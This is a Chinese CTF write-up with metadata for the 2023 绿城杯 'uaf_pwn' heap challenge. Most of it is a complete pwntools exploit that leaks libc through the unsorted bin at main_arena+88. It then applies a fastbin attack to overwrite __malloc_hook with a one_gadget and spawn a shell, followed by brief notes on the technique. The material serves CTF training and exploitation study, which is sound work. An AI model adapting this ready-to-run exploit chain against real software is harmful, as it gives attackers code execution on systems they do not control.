---
title: 漏洞学习之PWN-绿城杯uaf_pwn 分析
contest: 绿城杯
year: 2023
difficulty: easy
vuln_type: uaf
tags: [UAF, unsorted bin leak, main_arena+88, fastbin attack, __malloc_hook, one_gadget 0x4527a]
attack_chain: malloc(0x100)→unsorted bin→main_arena+88 leak→libc_base→malloc_hook=libc.symbols['__malloc_hook']+libc_base→one_gadget=libc+0x4527a→fill chunk1_fd→malloc(0x60)x2→fill 0x13字节padding+one_gadget→malloc触发
key_payload: "malloc(0x100);free(0);show(0)→leak main_arena+88;libc_base=leak-0x3c4b78;__malloc_hook=libc_base+offset;one_gadget=libc+0x4527a;fill(1, p64(malloc_hook-0x23))"
one_liner: 绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget
lesson: UAF + unsorted bin leak + fastbin fd覆盖到__malloc_hook是经典glibc 2.23 pwn模板
quality: high
---

# 漏洞学习之PWN-绿城杯uaf_pwn 分析

**赛事**：绿城杯（2023）

**漏洞类型**：UAF（Use-After-Free）

**完整EXP**：
```python
from pwn import *
import pdb

debug = 1
if (debug): 
    p = process("./uaf_pwn")
else: 
    p = remote('node4.buuoj.cn', 25403)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size):
    p.recvuntil(">"); p.sendline("1")
    p.recvuntil("size>"); p.sendline(str(size))

def free(idx):
    p.recvuntil(">"); p.sendline("2")
    p.recvuntil("index>"); p.sendline(str(idx))

def fill(idx, payload):
    p.recvuntil(">"); p.sendline("3")
    p.recvuntil("index>"); p.sendline(str(idx))
    p.recvuntil("content>"); p.send(payload)

def show(idx):
    p.recvuntil(">"); p.sendline("4")
    p.recvuntil("index>"); p.sendline(str(idx))
    return p.recv()[:-1]

# Step 1: 触发unsorted bin leak
malloc(0x100)  # idx 0 - 进入unsorted bin
malloc(0x60)   # idx 1
free(0)

leakaddr = show(0)  # leak <main_arena + 88>
libc_base = u64(leakaddr + b'\x00' + b'\x00') - 0x3c4b78
print(hex(libc_base))

# Step 2: fastbin attack → __malloc_hook
malloc_hook = libc.symbols['__malloc_hook'] + libc_base
one_gadget = libc_base + 0x4527a
free(1)  # free idx 1
fill(1, p64(malloc_hook - 0x23))  # chunk1.fd = malloc_hook-0x23

malloc(0x60)  # idx 2 - 拿到原idx 1的chunk
malloc(0x60)  # idx 3 - 拿到malloc_hook附近的chunk
fill(3, b'a'*0x13 + p64(one_gadget))  # 覆盖__malloc_hook

# Step 3: 触发malloc → one_gadget
malloc(0x10)
p.interactive()
```

**关键技术**：
- **unsorted bin leak**：malloc(0x100) → free → fd/bk指向main_arena+88
- **main_arena+88 - 0x3c4b78 = libc_base**（glibc 2.23固定偏移）
- **fastbin attack**：chunk1.fd = __malloc_hook - 0x23 → 分配到malloc_hook附近
- **0x23对齐**：0x13字节padding + p64(one_gadget) 对齐到__malloc_hook
- **one_gadget 0x4527a**：execve("/bin/sh", NULL, NULL)

**质量评估**：高（完整EXP + 注释清晰）
